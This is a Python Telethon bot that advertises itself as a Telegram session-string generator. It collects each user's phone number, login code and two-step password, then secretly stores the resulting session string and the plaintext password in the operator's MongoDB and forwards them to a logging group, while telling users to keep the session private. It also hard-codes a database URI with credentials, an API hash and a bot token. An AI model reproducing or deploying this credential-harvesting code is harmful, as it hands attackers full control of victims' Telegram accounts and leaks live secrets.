import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from pymongo import MongoClient

# MongoDB connection
client = MongoClient('mongodb+srv://SachinSanatani:SACHINxSANATANI@sanatani.bnmsfbd.mongodb.net/SACHIN?retryWrites=true&w=majority&appName=Sanatani')
db = client['session_bot']  # Database name
sessions_collection = db['sessions']  # Collection for storing session data

# Configuration from config.py (or direct input)
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7983720117:AAGN1CleTYHauUVyYj7xT_xHWPO2fgzWDGc"  
LOGGER_GROUP_ID = -1002452519381  

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_sessions = {}

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "┌────── Information ⏤͟͟͞͞‌‌‌‌★\n"
        "┆◍ Hey, my dear user 💐!\n"
        "┆● Nice to meet you!\n"
        "└─────────────────────────•\n"
        "❖ I am a String Generate Bot\n"
        "❖ You can use me to generate session\n"
        "❖ Support - Pyrogram | Telethon\n"
        "•─────────────────────────•\n"
        "❖ By: [Sanatani Tech](https://t.me/SANATANI_TECH) | [Sanatani Chat](https://t.me/SANATANI_SUPPORT)\n"
        "•─────────────────────────•",
        buttons=[
            [
                Button.inline("Generate Session", b"generate")
            ],
            [
                Button.url("Support", "https://t.me/SANATANI_SUPPORT"),
                Button.url("Updates", "https://t.me/SANATANI_TECH"),
            ],
            [
                Button.inline("Help Menu", b"help")
            ],
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
    )

@bot.on(events.CallbackQuery(pattern=b"help"))
async def send_help(event):
    help_text = """
❖ **How to Generate String Session?**

◍ Click on "Generate Session" or type **/generate**  
◍ Enter your phone number with country code,  
   • Example: `+919876543210`  
◍ Enter the OTP received on Telegram  
◍ If asked, enter your 2-step verification password  
◍ Your session string will be generated!  
◍ Keep your session safe & secure. Don't share it with anyone.  

❖ If you face any issues, use **/cancel** to reset and try again.
"""
    await event.respond(help_text, buttons=[Button.inline("🔙 Back", b"start")])

@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_command(event):
    await cancel_session(event)

@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_button(event):
    await cancel_session(event)

async def cancel_session(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Remove user session
        await event.respond("❖ Your session process has been canceled!\n◍ You can start again with /generate")
    else:
        await event.respond("❖ You are not in any session process.")

@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "❖ Enter your phone number with country code\n\n◍ Example: `+919876543210`",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
            user_sessions[user_id]["step"] = "otp"
            await event.respond(
                "OTP sent! Please enter the OTP received on Telegram.",
                buttons=[Button.inline("Cancel", b"cancel")]
            )
        except Exception as e:
            await event.respond(f"Error: {str(e)}. Please try again!")
            del user_sessions[user_id]

    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            # Store session in MongoDB
            sessions_collection.insert_one({
                "user_id": user_id,
                "phone": phone_number,
                "session_string": session_string
            })

            await bot.send_message(LOGGER_GROUP_ID, f"New Session Generated!\n\nUser: `{user_id}`\nPhone: `{phone_number}`\nSession: `{session_string}`")

            await event.respond(f"Your session string :\n\n`{session_string}`\n\nKeep this safe!")
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("Error: The OTP has expired. Please use /generate to get a new OTP.")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("Error: The OTP is incorrect. Please try again.")
        
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond(
                "Your account has 2-step verification enabled.\nPlease enter your Telegram password:",
                buttons=[Button.inline("Cancel", b"cancel")]
            )
        
        except Exception as e:
            await event.respond(f"Error: {str(e)} Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # Store session in MongoDB with password info
            sessions_collection.insert_one({
                "user_id": user_id,
                "session_string": session_string,
                "password_used": password
            })

            await bot.send_message(LOGGER_GROUP_ID, f"New session with 2-step verification!\n\nUser: `{user_id}`\nSession: `{session_string}`\nPassword used: `{password}`")

            await event.respond(f"Your session string :\n\n`{session_string}`\n\nKeep this safe!\n\nJoin: @SANATANI_TECH")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"Error: {str(e)}. Please try again.")

print("Bot is running...")
bot.run_until_disconnected()
